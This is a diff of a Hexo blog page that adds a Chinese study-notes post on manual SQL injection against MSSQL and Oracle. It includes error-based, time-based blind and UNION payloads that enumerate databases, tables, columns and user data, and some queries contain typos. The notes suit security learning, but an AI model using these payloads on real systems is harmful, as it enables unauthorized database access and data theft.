@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: 安全进阶 | Hexo</title>
+  <title>MSSSQL和Oracle的手工注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/tags/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/index.html">
+  <meta name="description" content="课堂笔记MSSQL（Microsoft SQL) &#x3D; SQL server PHP连接MySQL数据库、MSSQL数据库流程一致 mysqli_connect mysqli_query mysqli_fetch_array mssqli_connect mssqli_query mssqli_fetch_array 注入的关键在于是否有一个数据库或者表存放了数据库名称、表名称、字段名称。 其他数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSSSQL和Oracle的手工注入">
+<meta property="og:url" content="http://example.com/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="课堂笔记MSSQL（Microsoft SQL) &#x3D; SQL server PHP连接MySQL数据库、MSSQL数据库流程一致 mysqli_connect mysqli_query mysqli_fetch_array mssqli_connect mssqli_query mssqli_fetch_array 注入的关键在于是否有一个数据库或者表存放了数据库名称、表名称、字段名称。 其他数据">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-04-24T01:45:05.000Z">
+<meta property="article:modified_time" content="2021-04-24T09:08:52.966Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全进阶">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -150,36 +155,134 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-安全进阶/MSSSQL和Oracle的手工注入" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      MSSSQL和Oracle的手工注入
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+
+        
+        <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
   	<time datetime="2021-04-24T01:45:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">MSSSQL和Oracle的手工注入</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><p>MSSQL（Microsoft SQL) = SQL server</p>
+<p>PHP连接MySQL数据库、MSSQL数据库流程一致</p>
+<pre><code>mysqli_connect mysqli_query mysqli_fetch_array
+mssqli_connect mssqli_query mssqli_fetch_array</code></pre>
+<p>注入的关键在于是否有一个数据库或者表存放了数据库名称、表名称、字段名称。</p>
+<p>其他数据库注入：</p>
+<ul>
+<li>其他数据库在哪里存放了数据库名称等信息</li>
+<li>其中的函数是否一致，若不一致</li>
+</ul>
+<p>MSSQL的内置数据库master，存在3张表</p>
+<ul>
+<li><p>sysdatabases存放数据库名称，name字段存放所有数据库名</p>
+</li>
+<li><p>sysobjecs存放表名称，name字段存放当前数据库的所有表名（注意，该表存在于每个数据库中）</p>
+</li>
+<li><p>sysColumns存放字段名称，name字段存放所有字段名（注意，该表存在于每个数据库中）</p>
+</li>
+</ul>
+<p>查询格式：</p>
+<pre><code>select * from db_name.user_name.table_name  #注意要加上操作用户的名称
 
-        <div class="article-info info-on-right">
-          
+#查询数据库名称
+select name from master.dbo.sysdatabases
+也可以默认操作源
+select name from master..sysdatabases</code></pre>
+<p>mssql中没有group_concat、limit，若查询结果有多行，可用top n可以取到前n行的数据，若要查询指定行的数据：</p>
+<pre><code class="sql">--先查询m行的数据，然后把该数据丢弃，向下再查询n行的数据。例如：查询第2行的数据。
+select top 1 usernam from users where username not in (select top 1 username from users);</code></pre>
+<p>获取到数据库名称后，查询该数据库的所有表的名称</p>
+<pre><code class="sql">select name from db_name..sysobjects where xtype=&#39;U&#39;</code></pre>
+<p>获取所有字段。例如jiaofan数据库里的sl_admin表的所有字段</p>
+<pre><code class="sql">select name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;)
+
+--查询第2行的字段值
+select top 1 name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;) and name not in(select top 1 name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;)
+)
+</code></pre>
+<p>简化查询，使用内置函数object_id()根据表名返回数据库表名ID。</p>
+<pre><code class="sql">select name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;)
+
+--查询第2行的字段值
+select top 1 name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;) and name not in(select top 1 name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;))</code></pre>
+<p>msssql为强类型数据库，union查询的列数和类型必须相同，因此联合查询前需要判断数据类型。</p>
+<p>union all select</p>
+<p>报错注入：</p>
+<ul>
+<li>判断数据库基本信息：and 1=(select @@version)</li>
+<li>获取当前数据库用户：and 1=(select current_user)</li>
+</ul>
+<pre><code class="sql">select * from jiaofan..users where id=1 and 1=(select db_name())
+
+%&#39; and 1=(select name from jiaofan..sysobjects where xtype=&#39;U&#39;) -- 
+
+%&#39; and 1=(select top 1 name from jiaofan..sysobjects where xtype=&#39;U&#39; and name not in(select top 1 name from jiaofan..sysobjects where xtype=&#39;U&#39;)) -- </code></pre>
+<p>时间型盲注：waitfor delay ‘3’ </p>
+<pre><code class="sql">if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39;
+
+select 1 where 1=1 if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39;
+
+%&#39; if ((select substring(user,1,1))=&#39;d&#39;) waitfor delay &#39;0:0:3&#39;-- </code></pre>
+<p>mysql – 一个账号可以访问所有的表</p>
+<p>mssql –一个账号可以访问所有的表，但是访问时必须表明自己的身份</p>
+<p>Oracle – 一个账号只能管理一个数据库</p>
+<p>oracle 查询需要带上表名，dual万能表。</p>
+<pre><code>select 1,2,3 from dual       </code></pre>
+<p>查询当前数据库的所有表名</p>
+<pre><code>select table_name from user_tables</code></pre>
+<p>查询表名为xxx的所有字段名</p>
+<pre><code>select column_name from user_tab_columns where table_name=&#39;xxx&#39;</code></pre>
+<p>联合查询：</p>
+<pre><code>-1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3&#39; from dual --  
+
+
+-1&#39; union select table_name,&#39;2&#39;,&#39;3&#39; from user_tables where rownum=1 --  //查询到一张表T_USER
+
+-1&#39; union select column_name,&#39;2&#39;,&#39;3&#39; from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 --  //查询到一个字段SUSER
+
+-1&#39; union select SUSER,&#39;2&#39;,&#39;3&#39; from T_USER where rownum=1 --  </code></pre>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -191,209 +294,119 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E5%92%8COracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-04-24T01:43:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">MySQL的手工注入</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">MySQL的手工注入</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">课堂笔记</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-04-18T01:41:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-18</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">SQL注入原理与实践进阶</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/17/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/PHP%E4%B8%8ESQL%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-03-17T08:28:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/17/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/PHP%E4%B8%8ESQL%E8%BF%9B%E9%98%B6/">PHP与SQL进阶</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-03-16T02:00:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/">JavaScript代码进阶</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-03-15T06:47:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/">HTML代码进阶</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -416,9 +429,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: false,
